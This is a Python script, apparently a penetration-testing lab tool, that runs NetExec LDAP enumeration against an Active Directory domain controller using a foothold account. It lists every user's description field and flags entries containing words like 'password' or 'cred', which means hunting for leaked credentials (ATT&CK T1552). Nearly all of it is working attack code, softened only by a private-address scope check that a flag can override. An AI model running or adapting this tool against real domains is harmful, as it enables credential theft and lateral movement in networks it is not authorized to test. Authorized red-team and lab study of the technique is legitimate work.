#!/usr/bin/env python3
"""ad_loot.py - enumerate AD users + description fields via NetExec (nxc ldap), flag descriptions
that look like they contain credentials. Lab use: find passwords left in AD descriptions (ATT&CK T1552).

Authenticates with a provided foothold credential. RFC1918 targets only unless --allow-public.
"""
import argparse
import ipaddress
import json
import os
import re
import shutil
import socket
import subprocess
import sys

ANSI = re.compile(r'\x1b\[[0-9;]*m')
# Row format from `nxc ldap --users`:
# LDAP <ip> <port> <host> <username> <lastpwset|<never>> <badpw> <description...>
ROW = re.compile(
    r'^LDAP\s+\S+\s+\d+\s+\S+\s+(?P<user>\S+)\s+'
    r'(?P<pwset>\d{4}-\d\d-\d\d \d\d:\d\d:\d\d|<never>)\s+'
    r'(?P<badpw>\d+)\s*(?P<desc>.*)$'
)
SECRET = re.compile(r'(?i)(pass(word)?|pwd|cred|secret)')


def fail(msg):
    print(json.dumps({"error": msg}))
    sys.exit(1)


def main():
    ap = argparse.ArgumentParser(
        description="Enumerate AD user descriptions via nxc ldap; flag credential-like entries.")
    ap.add_argument("dc", help="DC IP or hostname (RFC1918 unless --allow-public)")
    ap.add_argument("-u", "--user", required=True, help="foothold username")
    ap.add_argument("-p", "--password", required=True, help="foothold password")
    ap.add_argument("--allow-public", action="store_true",
                    help="OVERRIDE: permit non-private targets (requires authorization)")
    args = ap.parse_args()

    if not shutil.which("nxc"):
        fail("nxc (NetExec) not found in this environment")
    try:
        ip = socket.gethostbyname(args.dc)
    except OSError as e:
        fail(f"cannot resolve {args.dc}: {e}")
    if not args.allow_public and not ipaddress.ip_address(ip).is_private:
        fail(f"out-of-scope target {args.dc} ({ip}) is not RFC1918")

    cmd = ["nxc", "ldap", args.dc, "-u", args.user, "-p", args.password, "--users"]
    # nxc writes its first-run config under HOME/NXC_HOME; the sandbox HOME may not be
    # writable, so point it at a temp dir we control.
    nxc_home = "/tmp/nxc"
    os.makedirs(nxc_home, exist_ok=True)
    env = {**os.environ, "HOME": nxc_home, "NXC_HOME": nxc_home}
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=180, env=env)
    except subprocess.TimeoutExpired:
        fail("nxc ldap timed out (180s)")

    text = ANSI.sub("", proc.stdout + "\n" + proc.stderr)
    authed = "[+]" in text and ("\\" + args.user.lower()) in text.lower()

    users = []
    for line in text.splitlines():
        m = ROW.match(line.strip())
        if not m:
            continue
        desc = m.group("desc").strip()
        users.append({
            "username": m.group("user"),
            "last_pw_set": m.group("pwset"),
            "bad_pw": int(m.group("badpw")),
            "description": desc,
            "flagged": bool(desc and SECRET.search(desc)),
        })

    flagged = [u for u in users if u["flagged"]]
    if not authed and not users:
        fail("authentication failed or no users returned; check creds/DC. "
             f"nxc said: {text.strip()[:300]}")

    print(json.dumps({
        "dc": args.dc,
        "ip": ip,
        "auth_user": args.user,
        "authenticated": authed,
        "user_count": len(users),
        "flagged_count": len(flagged),
        "flagged_users": flagged,
        "all_users": users,
    }, indent=2))


if __name__ == "__main__":
    main()
